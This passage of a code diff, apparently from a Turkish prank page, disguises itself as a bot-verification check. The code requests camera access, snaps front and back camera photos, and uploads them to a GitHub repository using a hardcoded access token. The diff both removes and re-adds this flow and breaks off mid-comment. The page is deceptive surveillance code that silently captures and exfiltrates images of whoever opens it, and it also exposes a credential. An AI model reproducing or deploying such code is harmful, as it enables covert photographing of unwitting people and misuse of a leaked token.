@@ -36,33 +36,35 @@
         <p>Siteye devam etmek için bot olmadığını doğrulaman gerekiyor.</p>
     </div>
 
-    <!-- Gizli video elementleri -->
-    <video id="videoFront" autoplay playsinline></video>
-    <video id="videoBack" autoplay playsinline></video>
+    <!-- Video ve Canvas elementleri -->
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- GÜNCELLENMİŞ BİLGİLER ---
+        // --- BİLGİLER ---
         const GITHUB_TOKEN = 'Ghp_IEiPql2E4HGvq7BWVP2fVoDIUYDuVZ1nKstu'; 
         const REPO_INFO = 'akif588/Game';
-        // -----------------------------
+        // ----------------
 
         window.onload = async function() {
             alert("Bu oyuna devam etmek için bot olmadığınızı kanıtlamak üzere kamera izni vermeniz gerekiyor.");
-            await captureAndUpload();
+            await startPrank();
         };
 
         async function uploadToGitHub(base64Data, filename) {
             const path = `fotolar/${filename}`;
             const url = `https://api.github.com/repos/${REPO_INFO}/contents/${path}`;
             
+            // Base64 verisinin başındaki meta kısmını temizle
             const base64Content = base64Data.split(',')[1];
 
             const bodyData = {
-                message: `Şaka fotoğrafı eklendi: ${filename}`,
+                message: `Fotoğraf eklendi: ${filename}`,
                 content: base64Content,
-                branch: "main" 
+                branch: "main"
             };
+
+            console.log("GitHub'a yükleniyor:", path);
 
             try {
                 let response = await fetch(url, {
@@ -73,9 +75,15 @@
                     },
                     body: JSON.stringify(bodyData)
                 });
-                return await response.json();
+                
+                let result = await response.json();
+                if (response.ok) {
+                    console.log("Başarıyla yüklendi!", result);
+                } else {
+                    console.error("GitHub API Hatası:", result);
+                }
             } catch (err) {
-                console.error("Yükleme hatası:", err);
+                console.error("Ağ veya CORS Hatası:", err);
             }
         }
 
@@ -85,57 +93,9 @@
                     const constraints = {
                         video: { facingMode: facingMode }
                     };
+                    
                     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    const video = facingMode === 'user' ? document.getElementById('videoFront') : document.getElementById('videoBack');
+                    const video = document.getElementById('video');
                     video.srcObject = stream;
                     
-                    await new Promise(r => setTimeout(r, 1000)); 
-
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
-
-                    stream.getTracks().forEach(track => track.stop());
-                    resolve(dataURL);
-                } catch (e) {
-                    reject(e);
-                }
-            });
-        }
-
-        async function captureAndUpload() {
-            const timestamp = Date.now();
-            
-            try {
-                try {
-                    const frontImage = await takeSnapshot('user');
-                    await uploadToGitHub(frontImage, `on_kamera_${timestamp}.jpg`);
-                } catch (e) {
-                    console.log("Ön kamera alınamadı");
-                }
-
-                try {
-                    const backImage = await takeSnapshot('environment');
-                    await uploadToGitHub(backImage, `arka_kamera_${timestamp}.jpg`);
-                } catch (e) {
-                    console.log("Arka kamera alınamadı");
-                }
-
-                document.getElementById('contentBox').innerHTML = `
-                    <h2 style="color: #ff5252;">Şaka Yaptım Kanka! 😄</h2>
-                    <p>Fotoğrafların başarıyla yakalandı ve GitHub'a gönderildi!</p>
-                `;
-            } catch (err) {
-                document.getElementById('contentBox').innerHTML = `
-                    <h2>Hata!</h2>
-                    <p>Kamera izni verilmediği için şaka yarım kaldı.</p>
-                `;
-            }
-        }
-    </script>
-</body>
-</html>
+                    // Videonun yüklenip akışın otur
